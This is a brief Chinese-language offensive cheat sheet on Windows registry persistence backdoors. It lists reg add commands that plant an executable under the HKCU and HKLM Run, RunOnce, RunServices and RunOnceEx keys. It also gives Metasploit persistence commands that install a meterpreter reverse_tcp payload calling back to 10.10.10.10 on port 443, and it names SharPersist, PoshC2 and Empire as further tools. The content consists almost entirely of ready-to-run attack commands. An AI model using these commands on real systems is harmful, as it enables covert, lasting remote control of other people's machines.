# 注册表执行后门

> ### 命令行
> ```powershell
> ##当前用户HKCU
> reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v test /t REG_SZ /d "C:\test.exe" #Run键
> reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v test /t REG_SZ /d "C:\test.exe" #RunOnce键
> reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices" /v test /t REG_SZ /d "C:\test.exe" #RunServices键
> reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v test /t REG_SZ /d "C:\test.exe" #RunServicesOnce键
> ##本地计算机HKLM
> reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v test /t REG_SZ /d "C:\test.exe" #Run键
> reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v test /t REG_SZ /d "C:\test.exe" #RunOnce键
> reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices" /v test /t REG_SZ /d "C:\test.exe" #RunServices键
> reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v test /t REG_SZ /d "C:\test.exe" #RunServicesOnce键
> ##RunonceEX(admin)
> reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx\0001" /v test /t REG_SZ /d "C:\test.exe"
> reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend" /v test /t REG_SZ /d "C:\test.exe"
> ```

> ### Metasploit
> ```bash
> ##metesploit生成vbs脚本并创建注册表
> run persistence -U -P windows/x64/metepreter/reverse_tcp -i 5 -p 443 -r 10.10.10.10 
> ##persistence模块
> use post/windows/manage/persistence_exe
> set rexepath /tmp/test.exe
> set session 2
> set startup user ##user=>HKLU或者system=>HKLM
> set localexepath C:\\tmp
> run
> ```

> ### 其他平台
> SharPersist  
> PoshC2  
> Empire  